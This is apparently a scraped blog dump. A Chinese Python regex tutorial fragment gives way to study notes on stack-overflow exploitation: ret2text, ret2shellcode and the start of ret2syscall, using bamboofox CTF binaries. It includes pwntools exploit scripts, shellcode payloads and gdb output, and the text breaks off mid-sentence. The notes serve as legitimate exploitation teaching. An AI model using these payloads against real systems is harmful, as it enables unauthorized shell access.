class=\"string\">&#x27;, &#x27;</span>, <span class=\"string\">&#x27;runoob&#x27;</span>, <span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>]</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>re.split(<span class=\"string\">&#x27;\\W+&#x27;</span>, <span class=\"string\">&#x27; runoob, runoob, runoob.&#x27;</span>, <span class=\"number\">1</span>) </span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;runoob, runoob, runoob.&#x27;</span>]</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>re.split(<span class=\"string\">&#x27;a*&#x27;</span>, <span class=\"string\">&#x27;hello world&#x27;</span>)   <span class=\"comment\"># 对于一个找不到匹配的字符串而言，split 不会对其作出分割</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;hello world&#x27;</span>]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>pattern</td>\n<td>匹配的正则表达式</td>\n</tr>\n<tr>\n<td>string</td>\n<td>要匹配的字符串。</td>\n</tr>\n<tr>\n<td>maxsplit</td>\n<td>分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。</td>\n</tr>\n<tr>\n<td>flags</td>\n<td>标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>\n</tr>\n</tbody></table>\n<h2 id=\"正则表达式对象\"><a href=\"#正则表达式对象\" class=\"headerlink\" title=\"正则表达式对象\"></a>正则表达式对象</h2><h3 id=\"re-RegexObject\"><a href=\"#re-RegexObject\" class=\"headerlink\" title=\"re.RegexObject\"></a>re.RegexObject</h3><p>re.compile() 返回 RegexObject 对象。</p>\n<h3 id=\"re-MatchObject\"><a href=\"#re-MatchObject\" class=\"headerlink\" title=\"re.MatchObject\"></a>re.MatchObject</h3><p>group() 返回被 RE 匹配的字符串。</p>\n<ul>\n<li>start() 返回匹配开始的位置</li>\n<li>end() 返回匹配结束的位置</li>\n<li>span() 返回一个元组包含匹配 (开始,结束) 的位置</li>\n</ul>\n<hr>\n<h2 id=\"正则表达式修饰符-可选标志\"><a href=\"#正则表达式修饰符-可选标志\" class=\"headerlink\" title=\"正则表达式修饰符 - 可选标志\"></a>正则表达式修饰符 - 可选标志</h2><p>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志：</p>\n<table>\n<thead>\n<tr>\n<th>修饰符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>re.I</td>\n<td>使匹配对大小写不敏感</td>\n</tr>\n<tr>\n<td>re.L</td>\n<td>做本地化识别（locale-aware）匹配</td>\n</tr>\n<tr>\n<td>re.M</td>\n<td>多行匹配，影响 ^ 和 $</td>\n</tr>\n<tr>\n<td>re.S</td>\n<td>使 . 匹配包括换行在内的所有字符</td>\n</tr>\n<tr>\n<td>re.U</td>\n<td>根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B.</td>\n</tr>\n<tr>\n<td>re.X</td>\n<td>该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"正则表达式模式\"><a href=\"#正则表达式模式\" class=\"headerlink\" title=\"正则表达式模式\"></a>正则表达式模式</h2><p>模式字符串使用特殊的语法来表示一个正则表达式：</p>\n<p>字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。</p>\n<p>多数字母和数字前加一个反斜杠时会拥有不同的含义。</p>\n<p>标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。</p>\n<p>反斜杠本身需要使用反斜杠转义。</p>\n<p>由于正则表达式通常都包含反斜杠，所以你最好使用原始字符串来表示它们。模式元素(如 r’\\t’，等价于 ‘\\t’)匹配相应的特殊字符。</p>\n<p>下表列出了正则表达式模式语法中的特殊元素。如果你使用模式的同时提供了可选的标志参数，某些模式元素的含义会改变。</p>\n<table>\n<thead>\n<tr>\n<th>模式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>^</td>\n<td>匹配字符串的开头</td>\n</tr>\n<tr>\n<td>$</td>\n<td>匹配字符串的末尾。</td>\n</tr>\n<tr>\n<td>.</td>\n<td>匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td>\n</tr>\n<tr>\n<td>[…]</td>\n<td>用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’</td>\n</tr>\n<tr>\n<td>[^…]</td>\n<td>不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。</td>\n</tr>\n<tr>\n<td>re*</td>\n<td>匹配0个或多个的表达式。</td>\n</tr>\n<tr>\n<td>re+</td>\n<td>匹配1个或多个的表达式。</td>\n</tr>\n<tr>\n<td>re?</td>\n<td>匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式</td>\n</tr>\n<tr>\n<td>re{ n}</td>\n<td>精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。</td>\n</tr>\n<tr>\n<td>re{ n,}</td>\n<td>匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于 “o*”。</td>\n</tr>\n<tr>\n<td>re{ n, m}</td>\n<td>匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式</td>\n</tr>\n<tr>\n<td>a| b</td>\n<td>匹配a或b</td>\n</tr>\n<tr>\n<td>(re)</td>\n<td>对正则表达式分组并记住匹配的文本</td>\n</tr>\n<tr>\n<td>(?imx)</td>\n<td>正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。</td>\n</tr>\n<tr>\n<td>(?-imx)</td>\n<td>正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。</td>\n</tr>\n<tr>\n<td>(?: re)</td>\n<td>类似 (…), 但是不表示一个组</td>\n</tr>\n<tr>\n<td>(?imx: re)</td>\n<td>在括号中使用i, m, 或 x 可选标志</td>\n</tr>\n<tr>\n<td>(?-imx: re)</td>\n<td>在括号中不使用i, m, 或 x 可选标志</td>\n</tr>\n<tr>\n<td>(?#…)</td>\n<td>注释.</td>\n</tr>\n<tr>\n<td>(?= re)</td>\n<td>前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。</td>\n</tr>\n<tr>\n<td>(?! re)</td>\n<td>前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功</td>\n</tr>\n<tr>\n<td>(?&gt; re)</td>\n<td>匹配的独立模式，省去回溯。</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>匹配字母数字及下划线</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>匹配非字母数字及下划线</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>匹配任意空白字符，等价于 [ \\t\\n\\r\\f]。</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>匹配任意非空字符</td>\n</tr>\n<tr>\n<td>\\d</td>\n<td>匹配任意数字，等价于 [0-9].</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>匹配任意非数字</td>\n</tr>\n<tr>\n<td>\\A</td>\n<td>匹配字符串开始</td>\n</tr>\n<tr>\n<td>\\Z</td>\n<td>匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。</td>\n</tr>\n<tr>\n<td>\\z</td>\n<td>匹配字符串结束</td>\n</tr>\n<tr>\n<td>\\G</td>\n<td>匹配最后匹配完成的位置。</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td>\n</tr>\n<tr>\n<td>\\B</td>\n<td>匹配非单词边界。’er\\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td>\n</tr>\n<tr>\n<td>\\n, \\t, 等.</td>\n<td>匹配一个换行符。匹配一个制表符。等</td>\n</tr>\n<tr>\n<td>\\1…\\9</td>\n<td>匹配第n个分组的内容。</td>\n</tr>\n<tr>\n<td>\\10</td>\n<td>匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"正则表达式实例\"><a href=\"#正则表达式实例\" class=\"headerlink\" title=\"正则表达式实例\"></a>正则表达式实例</h2><h4 id=\"字符匹配\"><a href=\"#字符匹配\" class=\"headerlink\" title=\"字符匹配\"></a>字符匹配</h4><table>\n<thead>\n<tr>\n<th>实例</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>python</td>\n<td>匹配 “python”.</td>\n</tr>\n</tbody></table>\n<h4 id=\"字符类\"><a href=\"#字符类\" class=\"headerlink\" title=\"字符类\"></a>字符类</h4><table>\n<thead>\n<tr>\n<th>实例</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>[Pp]ython</td>\n<td>匹配 “Python” 或 “python”</td>\n</tr>\n<tr>\n<td>rub[ye]</td>\n<td>匹配 “ruby” 或 “rube”</td>\n</tr>\n<tr>\n<td>[aeiou]</td>\n<td>匹配中括号内的任意一个字母</td>\n</tr>\n<tr>\n<td>[0-9]</td>\n<td>匹配任何数字。类似于 [0123456789]</td>\n</tr>\n<tr>\n<td>[a-z]</td>\n<td>匹配任何小写字母</td>\n</tr>\n<tr>\n<td>[A-Z]</td>\n<td>匹配任何大写字母</td>\n</tr>\n<tr>\n<td>[a-zA-Z0-9]</td>\n<td>匹配任何字母及数字</td>\n</tr>\n<tr>\n<td>[^aeiou]</td>\n<td>除了aeiou字母以外的所有字符</td>\n</tr>\n<tr>\n<td>[^0-9]</td>\n<td>匹配除了数字外的字符</td>\n</tr>\n</tbody></table>\n<h4 id=\"特殊字符类\"><a href=\"#特殊字符类\" class=\"headerlink\" title=\"特殊字符类\"></a>特殊字符类</h4><table>\n<thead>\n<tr>\n<th>实例</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>.</td>\n<td>匹配除 “\\n” 之外的任何单个字符。要匹配包括 ‘\\n’ 在内的任何字符，请使用象 ‘[.\\n]’ 的模式。</td>\n</tr>\n<tr>\n<td>\\d</td>\n<td>匹配一个数字字符。等价于 [0-9]。</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>匹配一个非数字字符。等价于 [^0-9]。</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。</td>\n</tr>\n</tbody></table>\n<p>w(ﾟДﾟ)w！！！！！！！！</p>\n<p>常用正则表达式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Email: &#x27;[0-9a-zA-Z]+@[0-9a-zA-Z]+\\.[a-zA-Z]&#123;2,3&#125;&#x27;</span><br><span class=\"line\">Ip地址: (ipv4)：&#x27;\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;&#x27;</span><br><span class=\"line\">Web地址: &#x27;https?:/&#123;2&#125;\\w.+&#x27;</span><br></pre></td></tr></table></figure>\n\n"},{"_content":"```c\n学习笔记4\n```\n\n**栈介绍**\n\n栈是一种典型的先进后出(First in Last Out)的数据结构，其操作主要有压栈(push)与出栈(pop)两种操作，如下图所示（维基百科）。两种操作都是操作栈顶，当然，它也有相应的栈底。\n\n在计算机的汇编程序运行过程中，也充分利用了这一数据结构。每个程序都有自己的进程地址空间，进程地址空间中的某一部分就是该程序对应的栈，用于**保存函数调用信息和局部变量**。此外，常见的操作也同样是压栈与出栈。需要注意的是，与一般我们理解不同的是，**程序的栈是从进程地址空间的高地址向低地址增长的**。\n\n**函数调用栈**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629135714461.png\" alt=\"image-20210629135714461\" style=\"zoom:67%;\" />\n\n需要注意的是，32位程序与64位程序有以下简单的区别\n\n- **x86**\n\n- **函数参数**在**函数返回地址**的上方\n- **x64**\n- x64中前六个参数依次保存在**RDI,RSI, RDX, RCX, R8和 R9寄存器**里，如果还有更多的参数的话才会保存在栈上。\n- 内存地址不能大于0x00007FFFFFFFFFFF，**6个字节长度**，否则会抛出异常。\n\n**栈溢出原理**\n\n栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞(比如说，还有向堆中写，向bss段写)。而对于黑客来说，栈溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：\n\n- 程序必须向栈上写入数据。\n- 写入的数据大小没有被良好地控制。\n\n最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址的代码可以执行**。下面，我们举一个简单的例子：\n\n```c\n##include <stdio.h>\n##include <string.h>\nvoid success() { puts(\"You Hava already controlled it.\"); }\nvoid vulnerable() {\n  char s[12];\n  gets(s);\n  puts(s);\n  return;\n}\nint main(int argc, char **argv) {\n  vulnerable();\n  return 0;\n}\n```\n\n这个程序的主要目的读取一个字符串，并将其输出。**我们希望可以控制程序执行success函数。**\n\n1.首先，我们利用如下命令对齐进行编译\n\n```shell\n➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example\nstack_example.c: In function ‘vulnerable’:\nstack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]\n   gets(s);\n   ^\n/tmp/ccPU8rRA.o：在函数‘vulnerable’中：\nstack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.\n```\n\n可以看出gets本身是一个危险函数。而它因为其从不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易可以导致栈溢出，\n\n历史上，**莫里斯蠕虫**第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。\n\n此外，-m32 指的是生成32位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成canary。此外，该程序并没有开启ASLR保护。这是为了更加方便地介绍栈溢出的基本利用方式。\n\n2.然后，我们在win操作机上利用IDA来反编译一下二进制程序并查看vulnerable函数（点击g输入vulnerable回车可以直接转到该函数），可以看到\n\n```c\nint vulnerable()\n{\n  char s; // [sp+4h] [bp-14h]@1\ngets(&s);\n  return puts(&s);\n}\n```\n\n3.可以看到，该字符串距离ebp的长度为0x14，那么相应的栈结构为\n\n```c\n     \t\t\t\t\t\t\t\t\t   +-----------------+\n                                           |     retaddr     |\n                                           +-----------------+\n                                           |     saved ebp   |\n                                    ebp--->+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14-->+-----------------+\n```\n\n并且，我们可以通过readelf获得success的地址，其地址为0x0804843B。\n\n```shell\nreadelf -a stack_example |grep success\n54: 0804843b    25 FUNC    GLOBAL DEFAULT   14 success\n```\n\n4.那么，如果我们读取的字符串为\n\n0x14*'a'+'bbbb'+success_addr\n\n由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为\n\n```c\n\t\t\t\t\t\t\t\t\t\t   +-----------------+\n                                           |    0x0804843B   |\n                                           +-----------------+\n                                           |       bbbb      |\n                                    ebp--->+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14-->+-----------------+\t\n```\n\n需要注意的是，由于在计算机内存中，对应的每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x0804843B的存储是如下结构\n\n\\x3b\\x84\\x04\\x08\n\n6.但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\\，x等也算一个单独的字符。。所以我们需要想办法将\\x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：\n\n```python\n##coding=utf8\nfrom pwn import *\n## 构造与程序交互的对象\nsh = process('./stack_example')\nsuccess_addr = 0x0804843b\n## 构造payload\npayload = 'a' * 0x14 + 'bbbb' + p32(success_addr)\nprint p32(success_addr)\n## 向程序发送字符串\nsh.sendline(payload)\n## 将代码交互转换为手工交互\nsh.interactive()\n#7.执行一波代码，可以得到\n➜  stack-example python exp.py\n[+] Starting local process './stack_example': pid 61936\n;\\x84\\x0\n[*] Switching to interactive mode\naaaaaaaaaaaaaaaaaaaabbbb;\\x84\\x0\nYou Hava already controlled it.\n[*] Got EOF while reading in interactive\n$ \n[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)\n[*] Got EOF while sending in interactive\n```\n\n可以看到我们确实已经执行success函数。\n\n**总结**\n\n**寻找危险函数**\n\n通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。\n\n常见的危险函数如下\n\n- 输入\n\n- - gets，直接读取一行，忽略'\\x00'\n  - scanf\n  - vscanf\n\n- 输出\n\n- - sprintf\n\n- 字符串\n\n- - strcpy，字符串复制，遇到'\\x00'停止\n  - strcat，字符串拼接，遇到'\\x00'停止\n  - bcopy\n\n**确定填充长度**\n\n这一部分主要是计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式\n\n- 相对于栈基地址的的索引\n- 相对应栈顶指针的索引\n- 直接地址索引\n\n其中相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得；相对于栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种问题。通过绝对地址索引的，就相当于直接给定了地址。一般来说，我们会有如下的覆盖需求\n\n- **覆盖函数返回地址**，这时候就是直接看EBP即可。\n- **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。\n- **覆盖bss段某个变量的内容**。\n- 等等\n\n之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。\n\n## ROP大章\n\n**基本ROP**-**ret2text**\n\n随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上(这一条之后不再重复提及)，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程。**所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。\n\n之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件\n\n- 程序存在溢出，并且可以控制返回地址。\n- 可以找到满足条件的gadgets以及相应gadgets的地址。如果当程序开启了PIE保护，那么就必须想办法泄露gadgets的地址了。\n\nret2text即需要我们控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是我们所要说的rop。\n\n这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。\t\n\n**bamboofox中介绍ROP时使用的ret2text的例子：**\n\n1.首先，查看一下程序的保护机制\n\n```c\n➜  ret2text checksec ret2text\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n可以看出程序是32位程序，其仅仅开启了栈不可执行保护。\n\n2.然后，我们在win操作机中使用IDA来查看源代码。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(_bss_start, 0, 1, 0);\n  puts(\"There is something amazing here, do you know anything?\");\n  gets((char *)&v4);\n  printf(\"Maybe I will tell you next time !\");\n  return 0;\n}\n```\n\n可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞。\n\n3.此后又发现，在secure函数又发现了存在调用system(\"/bin/sh\")的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到系统的shell了。\n\n```assembly\n.text:080485FD secure          proc near\n.text:080485FD\n.text:080485FD input           = dword ptr -10h\n.text:080485FD secretcode      = dword ptr -0Ch\n.text:080485FD\n.text:080485FD                 push    ebp\n.text:080485FE                 mov     ebp, esp\n.text:08048600                 sub     esp, 28h\n.text:08048603                 mov     dword ptr [esp], 0 ; timer\n.text:0804860A                 call    _time\n.text:0804860F                 mov     [esp], eax      ; seed\n.text:08048612                 call    _srand\n.text:08048617                 call    _rand\n.text:0804861C                 mov     [ebp+secretcode], eax\n.text:0804861F                 lea     eax, [ebp+input]\n.text:08048622                 mov     [esp+4], eax\n.text:08048626                 mov     dword ptr [esp], offset unk_8048760\n.text:0804862D                 call    ___isoc99_scanf\n.text:08048632                 mov     eax, [ebp+input]\n.text:08048635                 cmp     eax, [ebp+secretcode]\n.text:08048638                 jnz     short locret_8048646\n.text:0804863A                 mov     dword ptr [esp], offset command ; \"/bin/sh\"\n.text:08048641                 call    _system\n```\n\n4.下面就是我们如何构造payload了，首先需要确定的是我们能够控制的内存地址距离main函数的返回地址的字节数。\n\n```assembly\n.text:080486A7                 lea     eax, [esp+1Ch]\n.text:080486AB                 mov     [esp], eax      ; s\n.text:080486AE                 call    _gets\n```\n\n5.可以看到该字符串是通过相对于esp的索引，所以我们需要进行调试，将断点下在call处，查看esp，ebp，如下\n\n```assembly\ngef➤  b *0x080486AE\nBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\ngef➤  r\nThere is something amazing here, do you know anything?\nBreakpoint 1, 0x080486ae in main () at ret2text.c:24\n24      gets(buf);\n───────────────────────────────────────────────────────\n────────────────[registers ]───────────────────────────\n$eax   : 0xffffcd5c  →  0x08048329  →  \"__libc_start_main\"\n$ebx   : 0x00000000\n$ecx   : 0xffffffff\n$edx   : 0xf7faf870  →  0x00000000\n$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  \"__libc_start_main\"\n$ebp   : 0xffffcdc8  →  0x00000000\n$esi   : 0xf7fae000  →  0x001b1db0\n$edi   : 0xf7fae000  →  0x001b1db0\n$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>\n```\n\n6.可以看到esp为0xffffcd40，ebp为具体的payload如下0xffffcdc8，同时s相对于esp的索引为[esp+0x1c]，所以，s的地址为0xffffcd5c，所以s相对于ebp的偏移为0x6C，所以相对于返回地址的偏移为0x6c+4。\n\n最后的payload如下：\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./ret2text')\ntarget = 0x804863a\nsh.sendline('A' * (0x6c+4) + p32(target))\nsh.interactive()\n```\n\n**基本ROP**-**ret2shellcode**\n\nret2shellcode需要我们控制程序执行shellcode代码。而所谓的shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。**一般来说，shellcode都需要我们自己去填充。这其实是另外一种典型的利用的方法，即此时我们需要自己去填充一些可执行的代码**。\n\n而在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行shellcode，需要对应的binary文件没有开启NX保护。\n\n**以bamboofox中的ret2shellcode为例**\n\n```c\n➜  ret2shellcode checksec ret2shellcode\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x8048000)\n    RWX:      Has RWX segments\n```\n\n2.我们再win操作机中使用IDA看一下程序。可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 1, 0);\n  puts(\"No system for you this time !!!\");\n  gets((char *)&v4);\n  strncpy(buf2, (const char *)&v4, 0x64u);\n  printf(\"bye bye ~\");\n  return 0;\n}\n```\n\n3.ida中双击buf2，可知buf2在bss段。\n\n```assembly\n.bss:0804A080   public buf2\n.bss:0804A080 ; char buf2[100]\n```\n\n4.这时，我们简单的调试下程序，看看这一个bss段是否可执行。\n\n```assembly\ngef➤  b main\nBreakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.\ngef➤  r\nStarting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\nBreakpoint 1, main () at ret2shellcode.c:8\n8       setvbuf(stdout, 0LL, 2, 0LL);\n────────────[ source:ret2shellcode.c+8 ]────────────\n      6  int main(void)\n      7  {\n →    8      setvbuf(stdout, 0LL, 2, 0LL);\n      9      setvbuf(stdin, 0LL, 1, 0LL);\n     10  \n────────────────────────────────────[ trace ]────────────────────────\n[#0] 0x8048536 → Name: main()\n─────────────────────────────────────────────────────\ngef➤  vmmap\nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so\n0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so\n0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so\n0xf7faf000 0xf7fb2000 0x00000000 rwx\n0xf7fd3000 0xf7fd5000 0x00000000 rwx\n0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]\n0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]\n0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffb000 0xf7ffc000 0x00000000 rwx\n0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so\n0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so\n0xfffdd000 0xffffe000 0x00000000 rwx [stack]\n```\n\n5.通过vmmap，我们可以看到bss段对应的段具有可执行权限\n\n```assembly\n0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode\n```\n\n6.那么这次我们就控制程序执行shellcode，也就是读入shellcode，然后控制程序执行bss段处的shellcode。其中，相应的偏移计算类似于ret2text中的例子。\n\n具体的payload如下\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./ret2shellcode')\nshellcode = asm(shellcraft.sh())\nbuf2_addr = 0x804a080\nsh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))\nsh.interactive()\n```\n\n**基本ROP**-**ret2syscall**\n\nret2syscall需要我们控制程序执行系统调用，获取shell。\n\n这里我们以bamboofox中的ret2syscall为例\n\n1.首先检测程序开启的保护。\n\n```assembly\n➜  ret2syscall checksec rop\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n2.可以看出，源程序为32位，开启了NX保护。接下来利用IDA来查看源码\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\nsetvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 1, 0);\n  puts(\"This time, no system() and NO SHELLCODE!!!\");\n  puts(\"What do you plan to do?\");\n  gets(&v4);\n  return 0;\n}\n```\n\n3.可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得v4相对于ebp的偏移为108。所以我们需要覆盖的返回地址相对于v4的偏移为112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以我们利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。\n\n4.简单地说，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行int 0x80就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取shell\n\n```c\nexecve(\"/bin/sh\",NULL,NULL)\n```\n\n其中，该程序是32位，所以我们需要使得\n\n- 系统调用号即eax应该为0xb\n- 第一个参数即ebx应该指向/bin/sh的地址，其实执行sh的地址也可以\n- 第二个参数即ecx应该为0\n- 第三个参数edx应该为0\n\n而我们如何控制这些寄存器的值 呢？这里就需要使用gadgets。比如说，现在栈顶是10，那么如果此时执行了pop 